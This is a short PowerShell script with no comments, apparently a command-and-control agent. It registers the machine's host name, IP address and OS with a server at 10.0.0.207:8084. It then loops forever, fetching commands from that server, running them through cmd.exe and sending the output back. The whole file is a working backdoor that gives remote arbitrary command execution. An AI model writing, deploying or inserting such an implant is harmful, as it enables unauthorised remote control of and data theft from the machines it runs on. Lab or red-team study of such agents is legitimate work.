$hostname = $env:COMPUTERNAME
$ip = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
$os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption

$body = @{
    hostname = $hostname
    ip = $ip
    os = $os
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://10.0.0.207:8084/register" -Method POST -Body $body -ContentType "application/json"

while ($true) {
    $cmd = Invoke-RestMethod -Uri "http://10.0.0.207:8084/command/$hostname"
    if ($cmd) {
        $out = cmd.exe /c $cmd 2>&1
        $resp = @{ output = $out } | ConvertTo-Json
        Invoke-RestMethod -Uri "http://10.0.0.207:8084/result/$hostname" -Method POST -Body $resp -ContentType "application/json"
    }
    Start-Sleep -Seconds 10
}
